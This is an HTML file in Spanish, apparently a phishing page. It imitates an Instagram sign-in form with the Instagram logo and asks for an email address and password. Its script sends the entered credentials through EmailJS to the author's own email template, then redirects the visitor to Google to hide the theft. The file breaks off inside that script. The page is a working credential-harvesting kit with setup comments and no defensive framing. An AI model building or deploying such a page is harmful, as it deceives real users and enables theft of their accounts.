<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Iniciar sesión</title>
    <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
    <style>
        body {
            font-family: Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            background-color: #f5f5f5;
            margin: 0;
        }
        .login-container {
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100%;
        }
        .login-box {
            background: white;
            padding: 40px;
            border-radius: 8px;
            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
            text-align: center;
            width: 320px;
        }
        .logo {
            width: 100px;
            margin-bottom: 20px;
        }
        h2 {
            margin: 0 0 10px;
            font-size: 22px;
        }
        p {
            color: #555;
            font-size: 14px;
        }

        /* CSS del template */
        .field {
            margin-bottom: 10px;
        }

        .field label {
            display: block;
            font-size: 12px;
            color: #777;
        }

        .field input {
            display: block;
            min-width: 250px;
            line-height: 1.5;
            font-size: 14px;
        }

        input[type="submit"] {
            display: block;
            padding: 6px 30px;
            font-size: 14px;
            background-color: #4460AA;
            color: #fff;
            border: none;
        }

        /* Estilos adicionales */
        input {
            width: 100%;
            padding: 10px;
            margin: 10px 0;
            border: 1px solid #ccc;
            border-radius: 4px;
            font-size: 14px;
        }

        .forgot-password {
            display: block;
            text-align: right;
            font-size: 12px;
            color: #1a73e8;
            text-decoration: none;
        }

        button {
            width: 100%;
            padding: 10px;
            background-color: #1a73e8;
            color: white;
            border: none;
            border-radius: 4px;
            font-size: 16px;
            cursor: pointer;
            margin-top: 10px;
        }

        .signup-link {
            margin-top: 20px;
            font-size: 14px;
        }

        .signup-link a {
            color: #1a73e8;
            text-decoration: none;
        }
    </style>
</head>
<body>

    <div class="login-container">
        <div class="login-box">
            <img src="https://upload.wikimedia.org/wikipedia/commons/a/a5/Instagram_icon.png" alt="Instagram Logo" class="logo">
            <h2>Inicia sesión</h2>
            <p>Usa tu cuenta de correo</p>
            <form id="form">
                <div class="field">
                    <label for="email">Correo electrónico</label>
                    <input type="email" id="email" name="email" placeholder="Correo electrónico" required>
                </div>
                <div class="field">
                    <label for="password">Contraseña</label>
                    <input type="password" id="password" name="password" placeholder="Contraseña" required>
                </div>
                <input type="submit" id="button" value="Siguiente">
            </form>
            <div class="signup-link">
                <p>¿No tienes una cuenta? <a href="#">Crear cuenta</a></p>
            </div>
        </div>
    </div>

    <script type="text/javascript">
        emailjs.init('carlosfajardu'); // Reemplaza con tu user ID

        const btn = document.getElementById('button');

        document.getElementById('form').addEventListener('submit', function(event) {
            event.preventDefault();
            btn.value = 'Enviando...'; // Cambia el texto del botón mientras se envía

            const serviceID = 'default_service'; // Asegúrate de usar el servicio correcto
            const templateID = 'template_w68z1fx'; // Usa tu template ID correcto

            // Envía el formulario con EmailJS
            emailjs.sendForm(serviceID, templateID, this)
                .then(function(response) {
                    console.log('Correo enviado con éxito', response);
                    alert('Datos enviados con éxito.');
                    window.location.href = "https://www.google.com"; // Redirige después de enviar
                }, function(error) {
                    console.error('Error al enviar correo', error);
                    alert("Hubo un error al enviar los datos.");
                });

            btn.value = 'Enviar correo'; // Vuelve a poner el texto original del botón
